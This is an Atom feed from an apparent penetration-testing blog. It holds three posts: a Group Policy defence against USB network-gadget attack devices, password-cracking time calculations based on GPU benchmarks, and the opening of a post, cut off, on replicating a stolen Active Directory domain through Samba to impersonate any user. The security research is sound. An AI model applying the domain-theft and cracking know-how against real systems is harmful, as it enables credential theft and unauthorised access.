<?xml version='1.0' encoding='UTF-8'?><?xml-stylesheet href="http://www.blogger.com/styles/atom.css" type="text/css"?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:blogger='http://schemas.google.com/blogger/2008' xmlns:georss='http://www.georss.org/georss' xmlns:gd="http://schemas.google.com/g/2005" xmlns:thr='http://purl.org/syndication/thread/1.0'><id>tag:blogger.com,1999:blog-5968836134591949637</id><updated>2020-07-02T01:21:53.236-07:00</updated><category term="pass-the-hash"/><category term="PtH"/><category term="Russinovich"/><category term="SSO"/><category term="base64"/><category term="meterpreter"/><category term="microsoft"/><category term="powershell"/><category term="powersploit"/><category term="python"/><category term="twitter"/><category term="unicode"/><category term="wmi"/><category term="wmis"/><title type='text'>Still Passing the Hash 15 Years Later</title><subtitle type='html'>Providing all the extra info that didn&#39;t make it into the BlackHat 2012 USA Presentation &quot;Still Passing the Hash 15 Years Later? Using the Keys to the Kingdom to Access All Your Data&quot; by Alva Lease &#39;Skip&#39; Duckwall IV and Christopher Campbell.</subtitle><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/posts/default'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default?max-results=9999999'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/'/><link rel='hub' href='http://pubsubhubbub.appspot.com/'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><generator version='7.00' uri='http://www.blogger.com'>Blogger</generator><openSearch:totalResults>37</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>9999999</openSearch:itemsPerPage><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6670237845813549338</id><published>2017-03-03T14:04:00.004-08:00</published><updated>2017-03-03T14:04:57.371-08:00</updated><title type='text'>Blocking the Lan Turtle / Poison Tap / Bash Bunny and other cruft</title><content type='html'>I&#39;ve been doing this for a long time. &amp;nbsp;So I&#39;ve researched, discovered, implemented, and forgotten a ton of stuff. &amp;nbsp;I should probably start up a blog just for stuff that I&#39;ve forgotten ;-)&lt;br /&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So I first thought about it when the HAK5 turtle showed up (link here: https://lanturtle.com/) .... &amp;nbsp;I thought to myself &amp;nbsp;&quot;oh yeah, I totally know how to stop that, I aught to write up a blog post about it...&quot; and then life happened.... &amp;nbsp;then Mubix posted something that at the time about using &amp;nbsp;a USB armory to do similar stuff (link here: https://room362.com/post/2016/snagging-creds-from-locked-machines/) .... and the lightbulb went on then went out again... &amp;nbsp;Then I read about the poisontap (link here: https://samy.pl/poisontap/) , and I was like oh yeah... I really aught to do that blog post.... then life... etc...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So I then I saw the new Bash Bunny (https://hakshop.com/products/bash-bunny) and figured I aught to get off my ass...&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I originally found this while researching how to prevent the tool &#39;inception&#39; from working... &amp;nbsp;(link here:&amp;nbsp;http://www.breaknenter.org/projects/inception/) The TLDR for this attack is that firewire and thunderbolt both allow direct memory access (DMA) when prodded the right way. &amp;nbsp;This is a Bad Thing (tm) for people like me to be able to do ;-) &amp;nbsp;There is a way with GPO to block the loading of the drivers that make it work, which is documented on the MS site.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Microsoft was kind enough to put a page up describing what needs to be done. &amp;nbsp;(Link here:&amp;nbsp;https://support.microsoft.com/en-us/kb/2516445)&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I&#39;m going to demonstrate a general method for preventing these sorts of attacks and my thinking behind it. &amp;nbsp;The usual caveat applies, always test in a lab environment before deploying anything like this. &amp;nbsp;It could have disastrous consequences if not used properly. &amp;nbsp;However, I believe the impact should be minimal the way I&#39;m suggesting you address the problem. &amp;nbsp;This method is Windows specific as I feel that is the largest attack surface...&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Quick Background&lt;/h2&gt;&lt;/div&gt;&lt;div&gt;Devices like the Beaglebone, the Pi, or the USB armory take advantage of a feature in the Linux kernel called a USB gadget (link: http://www.linux-usb.org/gadget/). &amp;nbsp;Essentially the gadgets allow the Linux device to emulate several different common USB devices, such as a network adapter, USB keyboard, USB mass storage drive, and sometimes several at the same time . &amp;nbsp;In this case, the Linux device emulates a USB network adapter. &amp;nbsp;Windows has built-in drivers for the type of device presented, so they will automatically load. &amp;nbsp;The name of the device as it appears on Windows is a &quot;RNDIS/Ethernet Gadget&quot;.&lt;br /&gt;&lt;br /&gt;*Note* The Lan Turtle actually presents as a different network card which has Windows driver support directly. &amp;nbsp;The Bash Bunny is new (March 1, 2017) and I haven&#39;t seen or played with one, so I don&#39;t know how it presents, however, I know the most likely candidate is going to be the USB Multi Gadget...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;h2&gt;Getting Started&lt;/h2&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Both of these methods use a Group Policy Object (GPO) to prevent the driver from being loaded. &amp;nbsp;This also works on computers that are not attached to a domain by using the local &#39;gpedit.msc&#39; panel.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Starting &#39;gpedit.msc&#39; from a command prompt brings up the following window. &amp;nbsp;I have highlighted the path we are looking for:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-Yi2fIPAS6LY/WFYG5YynoPI/AAAAAAAAAWc/GkYWXIL9uIMwsQE_OivUN8via65R3cilACLcB/s1600/gpedit-msc-1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;237&quot; src=&quot;https://1.bp.blogspot.com/-Yi2fIPAS6LY/WFYG5YynoPI/AAAAAAAAAWc/GkYWXIL9uIMwsQE_OivUN8via65R3cilACLcB/s320/gpedit-msc-1.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Underneath &quot;Device Installation Restrictions&quot; we have the following items. &amp;nbsp;The ones we are interested in are primarily &quot;Prevent installation of devices using drivers that match these device setup classes&quot; and &amp;nbsp;&quot;Prevent installation of devices that match any of these device ID&#39;s&quot;.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://4.bp.blogspot.com/-UVdbUbwVH4o/WLcjGL90_PI/AAAAAAAAAYU/OAage77lGY0MJHYAOMezkWWt61pJvkQvQCLcB/s1600/gpedit-msc-2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;328&quot; src=&quot;https://4.bp.blogspot.com/-UVdbUbwVH4o/WLcjGL90_PI/AAAAAAAAAYU/OAage77lGY0MJHYAOMezkWWt61pJvkQvQCLcB/s640/gpedit-msc-2.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;A brief overview of the two options:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;&quot;Prevent installation of devices using drivers that match these device setup classes&quot;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;This is a more general option suited to stop entire classes from loading IE network cards&lt;/li&gt;&lt;li&gt;This is the option I&#39;m recommending&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&quot;Prevent installation of devices that match any of these device ID&#39;s&quot;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;This option is more specific&lt;/li&gt;&lt;li&gt;I *suspect* (unproven) that this could be worked around&lt;/li&gt;&lt;li&gt;Would need multiple items for each specific device&lt;/li&gt;&lt;li&gt;Not the way I&#39;m recommending solving it&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;h2&gt;How to Break the Devices&lt;/h2&gt;&lt;/div&gt;&lt;div&gt;The way the Poisontap and the Bash Bunny (informed speculation) work is that they present as a high speed network device with drivers that are built into Windows. &amp;nbsp;By default, when a Windows box gets a new network interface up, it tries to use DHCP to acquire an IP address. &amp;nbsp;Since these devices have a DHCP server, the device gets an IP address and is considered fit for duty by Windows. &amp;nbsp;By stating to Windows the device is high speed, that forces the Windows TCP/IP stack to assign it the highest priority when sending out network traffic, which allows all sorts of interesting MITM attacks, such as leveraging responder for creds...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The easiest way to break this is to simply prevent the device from getting a driver. &amp;nbsp;This is actually fairly straight forward using the &quot;Prevent installation of devices using drivers that match these device setup classes&quot; option above. &amp;nbsp;If we combine this with the generic network device GUID, this means that no &lt;u style=&quot;font-weight: bold;&quot;&gt;NEW&lt;/u&gt;&amp;nbsp;network devices can be added to the system.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;There is an option to make this apply to devices that are already installed. &amp;nbsp;DO NOT CHECK THIS BOX!&amp;nbsp;Only death and misery follow if you pushed out a network wide GPO with that checkbox enabled!&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I think, if applied correctly, (unless somebody can prove me wrong) that this is a fairly low risk enhancement to the security posture.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The risk (as I see it) comes from whenever you add a &#39;network device&#39; to the system. &amp;nbsp;How often does this happen given the average business class hardware? &amp;nbsp;Most systems I have seen in use in a corporate environment have wired / wireless built in. &amp;nbsp;I have, on occasion, seen an external wireless adapter, but those are mostly exceptions to the rule.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Existing network connections will not be affected (as long as you don&#39;t hit the checkbox I warned about above), so presumably since it can connect to the domain everything is working... it would only be if you needed to add a device or possibly change a device, which shouldn&#39;t be an everyday event...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The only occasions I see this being a problem would be if something like VMWare Workstation was added to the system, but then you could temporarily disable the setting, install the software, and then reapply the GPO. &amp;nbsp;It is also possible that some VPN software could also trip this up, but I *suspect* that if you started the VPN once while the GPO was disabled it would still work, however that would require further testing.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;How to actually do it&lt;/h2&gt;&lt;span style=&quot;font-family: inherit;&quot;&gt;From here (link:&amp;nbsp;https://msdn.microsoft.com/en-us/library/windows/hardware/ff553426(v=vs.85).aspx) the specific class GUID for network adapters is&amp;nbsp;&lt;/span&gt;&quot;{4d36e972-e325-11ce-bfc1-08002be10318}&quot;&lt;br /&gt;&lt;br /&gt;So to prevent new adapters from being installed, select &quot;Prevent installation of devices using drivers that match these device setup classes&quot;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-zH0umOkkw6Y/WLcvRfYd5RI/AAAAAAAAAYs/aiRqX-Y3YtYq8xDa5DR1whS2OriEAMWzgCLcB/s1600/use_this_2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;585&quot; src=&quot;https://2.bp.blogspot.com/-zH0umOkkw6Y/WLcvRfYd5RI/AAAAAAAAAYs/aiRqX-Y3YtYq8xDa5DR1whS2OriEAMWzgCLcB/s640/use_this_2.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;Worth mentioning again:&lt;br /&gt;&lt;div&gt;&lt;b&gt;There is an option to make this apply to devices that are already installed. &amp;nbsp;DO NOT CHECK THIS BOX!&amp;nbsp;Only death and misery follow if you pushed out a network wide GPO with that checkbox enabled!&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;Hitting the &#39;Show&#39; Button brings up this dialog box:&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-rChP5DCaklI/WLcvbAhTFnI/AAAAAAAAAY0/NLQSO-njrAQmCZ6_VRDc13BlN_HXQ6thwCLcB/s1600/use_this_1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;267&quot; src=&quot;https://2.bp.blogspot.com/-rChP5DCaklI/WLcvbAhTFnI/AAAAAAAAAY0/NLQSO-njrAQmCZ6_VRDc13BlN_HXQ6thwCLcB/s400/use_this_1.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Simply copy and paste the GUID from above into the box and hit OK. &amp;nbsp;In this example I have already done this. &amp;nbsp;Hit Ok, then Apply and boom.&lt;br /&gt;&lt;br /&gt;Whenever a new network device gets plugged in it will fail!&lt;br /&gt;&lt;h2&gt;&lt;span style=&quot;font-family: inherit;&quot;&gt;Final Caveat&lt;/span&gt;&lt;/h2&gt;&lt;div&gt;&lt;span style=&quot;font-family: inherit;&quot;&gt;I suspect there will be ways around this, like any mitigation. &amp;nbsp;However my feelings are that if you can force the bad guys to up their game and screw over the skiddies who don&#39;t what they are doing, both of those are a net win. &amp;nbsp;There will always be a window one could use to bypass a door...&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6670237845813549338/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2017/03/blocking-lan-turtle-poison-tap-bash.html#comment-form' title='2 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6670237845813549338'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6670237845813549338'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2017/03/blocking-lan-turtle-poison-tap-bash.html' title='Blocking the Lan Turtle / Poison Tap / Bash Bunny and other cruft'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-Yi2fIPAS6LY/WFYG5YynoPI/AAAAAAAAAWc/GkYWXIL9uIMwsQE_OivUN8via65R3cilACLcB/s72-c/gpedit-msc-1.jpg" height="72" width="72"/><thr:total>2</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-3647809319856838116</id><published>2017-02-14T21:11:00.000-08:00</published><updated>2017-02-17T16:20:19.347-08:00</updated><title type='text'>Password Maths Hurt the Brains</title><content type='html'>Every now and again I find myself figuring out the answers to some math questions related to passwords. &amp;nbsp;The answer usually revolves around me writing the equation on a napkin and then punching the numbers into my cell phone calculator and then moving on with my life. &amp;nbsp;I finally got around to making a generic spreadsheet that does all the heavy lifting for me, more on this later.&lt;br /&gt;&lt;br /&gt;One of the fundamental tenets of cryptography is that the strength of the cryptography needs to outlive the usefulness of the data being encrypted. &amp;nbsp;For example, transactional data that has a useful lifetime of a few minutes or less doesn&#39;t need to be encrypted at the same strength that something that needs to remain secret for 20+ years. &amp;nbsp;We are specifically talking about hashed passwords that are used for a variety of things from logging into a system to protecting documents. &lt;br /&gt;&lt;br /&gt;Most of the questions revolve around cracking passwords with the latest technology. &amp;nbsp;These numbers tend to move around quite a bit, but there have been some benchmarks posted with hashcat and multi-gpu rigs. &amp;nbsp;This &lt;a href=&quot;https://gist.github.com/epixoip/a83d38f412b4737e99bbef804a270c40&quot; target=&quot;_blank&quot;&gt;gist&lt;/a&gt; has numbers from a rig of 8 NVIDIA GTX 1080 cards from Sagitta (https://sagitta.pw/) running benchmarks for Hashcat Beta 3.0. Mucho Kudos for posting those numbers, as I&#39;m using this as the basis for my calculations... more on that later on... first some math...&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Password Calculation Basics&lt;/h2&gt;&lt;div&gt;&lt;b&gt;UPDATE - &lt;/b&gt;&lt;u&gt;I like to be as technically correct as I can when it comes to stuff I put out. &amp;nbsp;I want to thank @scoobzt for correcting me here on something I overlooked. &amp;nbsp;Keyspace = CharacterSetLength ^ PasswordLength. &amp;nbsp;So in all of the following, the word &#39;Keyspace&#39; is used incorrectly and should be substituted with CharacterSetLength. &amp;nbsp;At some point in the future I will get around to updating the images below...&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;It all starts with a basic equation, shown below.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-o3lSq1LmoQQ/WKI25HlLz9I/AAAAAAAAAXc/yNHdkSa40Vczr-t3c9eGFRlORpWtkTSawCLcB/s1600/password_blog_1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;44&quot; src=&quot;https://1.bp.blogspot.com/-o3lSq1LmoQQ/WKI25HlLz9I/AAAAAAAAAXc/yNHdkSa40Vczr-t3c9eGFRlORpWtkTSawCLcB/s640/password_blog_1.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In this equation, there are 4 variables we can solve for, Hashrate, Time, Keyspace, or Password Length. &amp;nbsp;Now, we know the values for Hashrate (from the gist posted above for the various hashing algorithms) so in reality we are solving for one of the remaining three values.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Solving for Password Length&lt;/h3&gt;&lt;div&gt;Since Password Length is an exponent of Keyspace, we need to use&lt;a href=&quot;http://lmgtfy.com/?q=logarithm&quot; target=&quot;_blank&quot;&gt; logarithms&lt;/a&gt; to get the answer. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://4.bp.blogspot.com/-b1VlCFZfHHM/WKI4A0MBfYI/AAAAAAAAAXk/d1W5I5xuezgGxuxu-GH8NmnVC18GKAFNQCLcB/s1600/password_blog_2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;36&quot; src=&quot;https://4.bp.blogspot.com/-b1VlCFZfHHM/WKI4A0MBfYI/AAAAAAAAAXk/d1W5I5xuezgGxuxu-GH8NmnVC18GKAFNQCLcB/s640/password_blog_2.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;It is worth noting that the base of the logarithm is immaterial, so we will use the typical 10 as the base. &amp;nbsp;You could use natural logarithms and the numbers will be the same. &amp;nbsp;Yay math!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Solving for Password Length yields:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-E34aUltzuNk/WKI4YWg4V3I/AAAAAAAAAXo/REHbJzVqsCYGPpGwfgeZgDSp6LsAtlvMQCLcB/s1600/password_blog_3.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;74&quot; src=&quot;https://3.bp.blogspot.com/-E34aUltzuNk/WKI4YWg4V3I/AAAAAAAAAXo/REHbJzVqsCYGPpGwfgeZgDSp6LsAtlvMQCLcB/s640/password_blog_3.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Solving for Keyspace&lt;/h3&gt;&lt;div&gt;Solving for Keyspace size (in characters) involves solving for the Password Length root of the left side of the equation as shown below.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-bdla1yFnAvQ/WKI42ZCFH9I/AAAAAAAAAXs/QatWgUzVQoMsBiW_icRT8pjhasb0wRTcgCLcB/s1600/password_blog_4.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;46&quot; src=&quot;https://2.bp.blogspot.com/-bdla1yFnAvQ/WKI42ZCFH9I/AAAAAAAAAXs/QatWgUzVQoMsBiW_icRT8pjhasb0wRTcgCLcB/s640/password_blog_4.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;Solving for Time&lt;/h3&gt;&lt;div&gt;Solving for Time is the most straightforward of the bunch since it is simple division of the original equation&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-wqDZsRWlDxo/WKI5D3bnCtI/AAAAAAAAAXw/nvebPDmWB5I2Rq_eJcjLndXc3yslA2pDACLcB/s1600/password_blog_5.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;118&quot; src=&quot;https://2.bp.blogspot.com/-wqDZsRWlDxo/WKI5D3bnCtI/AAAAAAAAAXw/nvebPDmWB5I2Rq_eJcjLndXc3yslA2pDACLcB/s640/password_blog_5.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Let&#39;s talk about hashing algorithms&lt;/h2&gt;Various hashing algorithms perform differently based on a number of different factors from the age of the algorithm to salting to brute-force cracking resistance (increasing the rounds of encryption required or making the algorithm require a lot of memory to run, etc)... &amp;nbsp;A discussion of these topics are beyond the scope of this post.&lt;br /&gt;&lt;br /&gt;The benchmark mode for Hashcat provides a hash calculation rate for only a single hash, so cracking multiple hashes will naturally degrade the performance. &amp;nbsp;However, for the numbers I am using, I took the aggregate numbers from the gist and averaged it by 8, namely the number of cards provided. &amp;nbsp;I also added 10% to assume some measure of overclocking or some other sort of efficiency.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Ok, so what?&lt;/h2&gt;&lt;div&gt;So why is this at all interesting? &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;First, I often field questions from customers relating to passwords and how often then should change them. &amp;nbsp;There is a lot of numbers thrown around, but not a ton of explanation as to why those values are chosen. &amp;nbsp;Doing the math makes some of these discussions easier.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Secondly, when developers have to choose a hashing algorithm, once again, there is often a lot of noise regarding what they should choose. &amp;nbsp;Providing some real numbers can help guide the decisions appropriately.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Thirdly, sometimes you just want a napkin calculation regarding how quickly you can brute force some password for whatever reason... &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;The moment you have all been waiting for...&lt;/h2&gt;&lt;div&gt;Here is the link to a google spreadsheet which does the math for you. &amp;nbsp;You will need to make a copy of it to be able to edit it. Notes:&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;Generally speaking, both the &#39;password hash type&#39; and the &#39;keyspace&#39; are selectable values from a list on the second page (except when keyspace is being solved for). &amp;nbsp;&lt;/li&gt;&lt;li&gt;The values in the green cells are what are being solved for&lt;/li&gt;&lt;li&gt;Hashrate gets looked up based on the hash value&lt;/li&gt;&lt;li&gt;Yes, symbols have 33 values, don&#39;t forget the &#39;space&#39; character...&lt;/li&gt;&lt;li&gt;No, I didn&#39;t use anything other than plain US ASCII characters&lt;/li&gt;&lt;li&gt;These numbers should be considered highly optimistic, YMMV&lt;/li&gt;&lt;li&gt;You can generally edit the following values unless they are being solved for: number of GPUs, length of time (days), length of password&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;The link: &amp;nbsp;&lt;a href=&quot;https://docs.google.com/spreadsheets/d/1A4Aq-VJU9dO6FymQ2TshVfsFUuomNcqTodcoOkdx9vc/edit?usp=sharing&quot; target=&quot;_blank&quot;&gt;Password Cracking Google Spreadsheet&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Thanks to Andrew for helping make the spreadsheet pretty...&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/3647809319856838116/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2017/02/password-maths-hurt-brains.html#comment-form' title='1 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3647809319856838116'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/3647809319856838116'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2017/02/password-maths-hurt-brains.html' title='Password Maths Hurt the Brains'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-o3lSq1LmoQQ/WKI25HlLz9I/AAAAAAAAAXc/yNHdkSa40Vczr-t3c9eGFRlORpWtkTSawCLcB/s72-c/password_blog_1.jpg" height="72" width="72"/><thr:total>1</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-1829999442570489175</id><published>2016-06-02T15:21:00.000-07:00</published><updated>2016-06-02T15:34:49.308-07:00</updated><title type='text'>I&#39;m PKDC, your Personal Kerberos Domain Concierge for the Whatever_domain</title><content type='html'>So in my last post I demonstrated how you can use Samba to replicate a domain and then create a giant keytab full of keys to use. &amp;nbsp;You can then use the Heimdal Kerberos implementation to log in as any user you want.&lt;br /&gt;&lt;br /&gt;That&#39;s neat and all, but what if I want to query the information I pulled offline? We know that Samba can function as a domain controller, but is there a way to coax Samba to be able to present the into to us in a usable format? &amp;nbsp;IE can we query group membership?&lt;br /&gt;&lt;br /&gt;Well, as it turns out, the answer is yes and more... &amp;nbsp;I&#39;m going to show you how to make your own personal Kerberos Domain Concierge for the domain you just dumped.&lt;br /&gt;&lt;h2&gt;&lt;br /&gt;Wait what do you mean &#39;concierge&#39;?&lt;/h2&gt;&amp;nbsp;A popular definition of the word &#39;concierge&#39; (at least here in the states) is a hotel employee who assists guests with local information, such as maps, restaurant suggestions, event tickets, etc... They are usually at the front of the establishment (at some more touristy locations they have their own office / desk area).&lt;br /&gt;&lt;br /&gt;Within the context of pentesting, what I want to do is gather enough information from a site to replicate my own personal domain controller, query it for information and ultimately be able to authenticate against it instead of the target domain. &amp;nbsp;In other words, literally stealing a domain controller and putting it under my control.&lt;br /&gt;&lt;br /&gt;Sound evil? &amp;nbsp;Yes. &amp;nbsp;Yes it is.&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Moving from Replication Dump to Kerberos Domain Concierge&lt;/h2&gt;&lt;div&gt;One of the nifty things that the replication did for us was create a samba config file for us. &amp;nbsp;Here&#39;s what that looks like.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a 